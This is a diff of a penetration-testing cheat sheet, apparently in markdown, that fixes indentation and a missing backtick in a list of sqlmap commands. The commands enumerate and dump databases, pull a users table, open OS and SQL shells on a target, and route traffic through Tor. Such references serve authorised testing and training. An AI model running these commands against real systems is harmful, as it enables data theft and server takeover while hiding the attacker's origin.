@@ -1847,11 +1847,11 @@ Client, Web and Password Attacks
          
                `sqlmap -o -u http://$ip/index.php --forms --dbs  `
                
-                `sqlmap -o -u "http://$ip/form/" --forms`
+               `sqlmap -o -u "http://$ip/form/" --forms`
                 
           - Sqlmap check form for injection  
           
-                 `sqlmap -o -u "http://$ip/vuln-form" --forms -D database-name -T users --dump`
+                `sqlmap -o -u "http://$ip/vuln-form" --forms -D database-name -T users --dump`
                  
            - Enumerate databases  
            
@@ -1859,35 +1859,35 @@ Client, Web and Password Attacks
                  
             - Enumerate tables from a specific database  
                   
-                  `sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" --tables  `
+                 `sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" --tables  `
                   
             - Dump table data from a specific database and table  
             
-                   `sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" -T "$TABLE" --dump `
+                 `sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" -T "$TABLE" --dump `
                    
              - Specify parameter to exploit  
              
-                    `sqlmap --dbms=mysql -u "http://www.example.com/param1=value1&param2=value2" --dbs -p param2 `
+                 `sqlmap --dbms=mysql -u "http://www.example.com/param1=value1&param2=value2" --dbs -p param2 `
                     
              - Specify parameter to exploit in 'nice' URIs (exploits param1)
              
-                     `sqlmap --dbms=mysql -u "http://www.example.com/param1/value1*/param2/value2" --dbs `
+                 `sqlmap --dbms=mysql -u "http://www.example.com/param1/value1*/param2/value2" --dbs `
                      
               - Get OS shell  
               
-                     `sqlmap --dbms=mysql -u "$URL" --os-shell`
+                 `sqlmap --dbms=mysql -u "$URL" --os-shell`
                        
                - Get SQL shell  
-                        
-                      `sqlmap --dbms=mysql -u "$URL" --sql-shell`
+                       
+                  `sqlmap --dbms=mysql -u "$URL" --sql-shell`
                         
                 - SQL query  
                 
-                       `sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" --sql-query "SELECT * FROM $TABLE;" 
+                   `sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" --sql-query "SELECT * FROM $TABLE;"` 
                          
                  - Use Tor Socks5 proxy  
                  
-                        `sqlmap --tor --tor-type=SOCKS5 --check-tor --dbms=mysql -u "$URL" --dbs`
+                    `sqlmap --tor --tor-type=SOCKS5 --check-tor --dbms=mysql -u "$URL" --dbs`
 
 -   Password Attacks
     --------------------------------------------------------------------------------------------------------------
